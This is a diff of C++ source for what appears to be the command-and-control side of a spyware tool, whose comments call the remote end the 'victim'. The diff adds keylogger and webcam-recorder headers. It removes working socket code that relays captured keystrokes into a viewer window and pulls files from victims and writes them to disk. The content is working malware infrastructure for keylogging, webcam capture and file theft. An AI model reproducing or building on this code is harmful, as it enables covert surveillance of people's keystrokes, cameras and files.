@@ -1,5 +1,6 @@
 #include "spy_tunnel.hpp"
-#include <sys/eventfd.h>
+#include "keylogger.hpp"
+#include "webcam_recorder.hpp"
 
 int SpyTunnel::init(const std::string& __ip, uint __port, int*& __p_tunnel_shutdown_fd, int __connection_type) {    
     memset(&tunnel_addr_, 0, sizeof(tunnel_addr_));
@@ -25,121 +26,27 @@ int SpyTunnel::init(const std::string& __ip, uint __port, int*& __p_tunnel_shutd
         return -1;
     }
 
-    if (listen(tunnel_socket_, 1) == -1) {
-        close(tunnel_socket_);
-        return -1;
+    if (__connection_type == TCP_BASED) {
+        if (listen(tunnel_socket_, 1) == -1) {
+            close(tunnel_socket_);
+            return -1;
+        }
     }
     __p_tunnel_shutdown_fd = &tunnel_shutdown_fd_.fd;
 
     return 0;
 }
 
-// Child process spawning the window
-// Parent process will be communicating with the tunnel (victim) and forwarding packets to the fifo
-void SpyTunnel::run() {
-    pid_ = fork();
-    if (pid_ == -1) {
-        std::cerr << RED << "[SpyTunnel::run] Error creating child process" << RESET;
-        return;
-    } else if (pid_ == 0) {
-        spawn_window();
-        _exit(EXIT_FAILURE);
-    }
+void SpyTunnel::set_dev(int __dev_num) {
+    dev_num_ = static_cast<uint32_t>(__dev_num);
+}
 
-    int tries = 0;
-    while ((tunnel_fifo_ = open(fifo_path_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
-        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
-        std::this_thread::sleep_for(std::chrono::milliseconds(200));
-    }
-
-    if (tunnel_fifo_ == -1) {
-        std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
-        return;
-    }
-    
-    tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
-    if (tunnel_shutdown_fd_.fd == -1) {
-        write_fifo_error("[SpyTunnel::run] Error creating shutdown event file descriptor " + std::string(strerror(errno)));
-        return;
-    }
-
-    int rc = accept_tunnel_end();
-    if (rc < 0) {
-        return;
-    }
-
-    if (Keylogger* keylogger = dynamic_cast<Keylogger*>(this)) {
-        keylogger->send_dev();
-    }
-
-    ScopedEpollFD epoll_fd;
-    rc = create_epoll_fd(epoll_fd);
-    if (rc < 0) {
-        return;
-    }
-    
-    struct epoll_event tunnel_end_event;
-    tunnel_end_event.data.fd = tunnel_end_socket_;
-    tunnel_end_event.events = EPOLLIN;
-    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_end_socket_, &tunnel_end_event) == -1) {
-        write_fifo_error("[SpyTunnel::run] Error adding tunnel end socket to epoll " + std::string(strerror(errno)));
-        return;
-    }
-    
-    char buf[BUFFER_SIZE];
-
-    struct epoll_event events[2];
-    while (true) {
-        int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);
-        if (nfds < 0) {
-            if (errno == EINTR) {
-                continue;
-            }
-            write_fifo_error("[SpyTunnel::run] Error waiting for epoll event " + std::string(strerror(errno)));
-            break;
-        }
-
-        for (int i=0;i<nfds;i++) {
-            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
-                uint64_t u;
-                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
-                std::cout << MAGENTA << "[SpyTunnel::run] Shutdown signal received" << RESET;
-                if (tunnel_fifo_ != -1) {
-                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
-                    close(tunnel_fifo_);
-                }
-                return;
-            } else if(events[i].data.fd == tunnel_end_socket_) {
-                int bytes_read = recv(tunnel_end_socket_, buf, sizeof(buf), 0);
-                if (bytes_read < 0) {
-                    write_fifo_error("[SpyTunnel::run] Error receiving data from tunnel end socket " + std::string(strerror(errno)));
-                    return;
-                } else if (bytes_read == 0) {
-                    write_fifo_error("[SpyTunnel::run] Tunnel end socket closed by the peer");
-                    return;
-                } else {
-                    if (memcmp(buf, OUT_KEY, OUT_KEY_LEN) == 0) {
-                        write_fifo_error("[SpyTunnel::run] An error occurred during tunnel execution");
-                        return;
-                    }
-                    write(tunnel_fifo_, buf, bytes_read);
-                }
-            }
-        }
-    }
-
+void SpyTunnel::set_out(const std::string& __out_name) {
+    out_name_ = __out_name;
 }
 
 void SpyTunnel::send_dev() {
     send(tunnel_end_socket_, &dev_num_, sizeof(dev_num_), 0);
-}
-
-void Keylogger::set_dev(int __dev_num) {
-    dev_num_ = static_cast<uint32_t>(__dev_num);
-}
-
-void Keylogger::set_layout(const std::string& __layout) {
-    layout_ = __layout;
 }
 
 int SpyTunnel::accept_tunnel_end() {
@@ -245,75 +152,6 @@ void SpyTunnel::write_fifo_error(const std::string& __msg) {
     }
 }
 
-void Keylogger::spawn_window() {
-    execlp("urxvt", "urxvt", "-hold", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, fifo_path_.c_str(), layout_.c_str(), (char*)NULL);
-}
-
-PacketTunnel::PacketTunnel(const std::string& __file_name, const std::string& __out_name, EventLog* __p_event_log, size_t __limit) 
-: file_name_(__file_name), out_name_(__out_name), p_event_log_(__p_event_log), limit_(__limit) {}
-
-void PacketTunnel::run() { // No need for spawning a window. Just receive the file
-    tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
-    if (tunnel_shutdown_fd_.fd == -1) {
-        write_fifo_error("[SpyTunnel::run] Error creating shutdown event file descriptor " + std::string(strerror(errno)));
-        return;
-    }
-
-
-    int rc = accept_tunnel_end();
-    if (rc < 0) {
-        return;
-    }
-
-    // Send the file name first
-    rc = send(tunnel_end_socket_, file_name_.c_str(), file_name_.size(), 0);
-    if (rc < 0) {
-        *p_event_log_ << LOG_MUST << RED << "[PacketTunnel::run] Error while sending the file name: " << strerror(errno) << RESET_C2_FIFO;
-        return;
-    } else if (rc == 0) {
-        *p_event_log_ << LOG_MUST << RED << "[PacketTunnel::run] Peer disconnected while sending file name"<< RESET_C2_FIFO;
-        return;
-    }
-
-    // Recv the file 
-    // **WARNING** this saves the file contents inside the memory until it is done
-    // Receiving large files might cause program to act sluggish
-    struct timeval timeout;
-    timeout.tv_sec = 5;
-    timeout.tv_usec = 0;
-    setsockopt(tunnel_end_socket_, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
-
-    ScopedBuf* buf = new ScopedBuf();
-    rc = recv_all(tunnel_end_socket_, buf, limit_);
-    if (rc <= 0) {
-        *p_event_log_ << LOG_MUST << RED << "[PacketTunnel::run] Error while receiving: " << rc << RESET_C2_FIFO;
-        delete buf;
-        return;
-    }
-
-    size_t received = get_total_size(buf);
-    *p_event_log_ << LOG_MUST << GREEN << "[PacketTunnel::run] Received with size: " << received << RESET_C2_FIFO;
-
-    // Save the file
-    std::ofstream out(out_name_, std::ios::binary);
-    if (!out.is_open()) {
-        *p_event_log_ << LOG_MUST << RED << "[PacketTunnel::run] Failed to open output file: " << out_name_ << RESET_C2_FIFO;
-        delete buf;
-        return;
-    }
-
-    for (ScopedBuf* current = buf; current != nullptr;current=current->next_) {
-        if (current->buf_ && current->len_ > 0) {
-            out.write(current->buf_, current->len_);
-        }
-    }
-
-    out.close();
-    *p_event_log_ << LOG_MUST << GREEN << "[PacketTunnel::run] File saved to: " << out_name_ << RESET_C2_FIFO;
-
-    delete buf;
-}
-
 Tunnel::Tunnel(int __client_index, CommandCode __command_code, SpyTunnel* __p_spy_tunnel) {
     command_code_ = __command_code;
     client_index_ = __client_index;
@@ -341,6 +179,10 @@ void erase_tunnel(std::vector<Tunnel*>* __p_tunnels, int __client_index, Command
 }
 
 void SpyTunnel::spawn_window() {
+    // Overridden
+}
+
+void SpyTunnel::run() {
     // Overridden
 }
 
